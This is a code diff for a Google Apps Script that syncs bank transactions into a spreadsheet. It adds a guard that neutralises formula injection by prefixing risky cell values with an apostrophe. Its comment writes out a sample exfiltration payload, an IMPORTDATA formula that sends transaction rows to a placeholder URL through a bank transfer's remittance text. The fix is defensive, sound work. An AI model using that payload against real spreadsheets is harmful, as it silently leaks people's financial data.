@@ -99,8 +99,41 @@ function colIndex_(headers, name) {
   return index + 1;
 }
 
+/**
+ * A value on its way into a cell, stripped of the power to be a formula.
+ *
+ * `setValue` and `setValues` do not write text. They write what a person
+ * typing that string would get, and a string beginning with `=` is a live
+ * formula — evaluated by Sheets, server-side, with this book's own access.
+ * That is fine for the strings this project authors and dangerous for the one
+ * input source that is neither the owner nor gated: **the bank**.
+ *
+ * `remittance_information` is free text the *sending* party fills in. Anyone
+ * who knows the IBAN can send a euro cent and choose what column I says, and
+ * `=IMPORTDATA("https://…?d="&ENCODEURL(JOIN("|",transactions!I2:I200)))` fits
+ * inside SEPA's 140 characters with room to spare. `IMPORTDATA` fetches with
+ * no consent prompt — unlike `IMPORTRANGE`, which asks — so the first sync
+ * after the transfer lands ships the ledger out and looks like a normal run.
+ * `counterparty` is the same shape: the sender chooses their own account name.
+ *
+ * The guard belongs here rather than at the point the description is built,
+ * because the danger is a property of *writing to a cell* and not of any one
+ * field. Every intentional formula in this project goes through `setFormula_`
+ * instead — checked at every call site, and the reason this cannot break one.
+ *
+ * A leading apostrophe is Sheets' own "this is text" marker: it is consumed on
+ * write and absent from `getValue`, so the round trip is lossless and a
+ * description that genuinely starts with `=` still reads back as it was sent.
+ * Idempotent by construction — the result no longer starts with a trigger
+ * character — which is what makes it safe to apply at more than one boundary.
+ */
+function textSafe_(value) {
+  if (typeof value !== 'string' || !value) return value;
+  return /^[=+\-@]/.test(value) ? "'" + value : value;
+}
+
 function writeCell_(sheet, row, headers, name, value) {
-  sheet.getRange(row, colIndex_(headers, name)).setValue(value);
+  sheet.getRange(row, colIndex_(headers, name)).setValue(textSafe_(value));
   forgetReadCache_();
   if (versionedSheet_(sheet)) bumpDataVersion_();
 }
@@ -113,7 +146,7 @@ function readCell_(sheet, row, headers, name) {
 function toRow_(headers, record) {
   return headers.map(function (name) {
     var value = record[name];
-    return value === undefined || value === null ? '' : value;
+    return value === undefined || value === null ? '' : textSafe_(value);
   });
 }
 
@@ -362,8 +395,13 @@ function appendRows_(sheet, keyColumn, rows) {
     }
   });
 
+  // Again rather than only in `toRow_`, because a caller is free to hand over
+  // an array it built itself and this is the append every synced row takes.
+  // `textSafe_` is idempotent, so paying for it twice costs nothing but a pass.
+  var safe = rows.map(function (row) { return row.map(textSafe_); });
+
   var start = lastRecordRow_(sheet, keyColumn) + 1;
-  sheet.getRange(start, 1, rows.length, width).setValues(rows);
+  sheet.getRange(start, 1, rows.length, width).setValues(safe);
   forgetReadCache_();
   if (versionedSheet_(sheet)) bumpDataVersion_();
   return { row: start, count: rows.length };
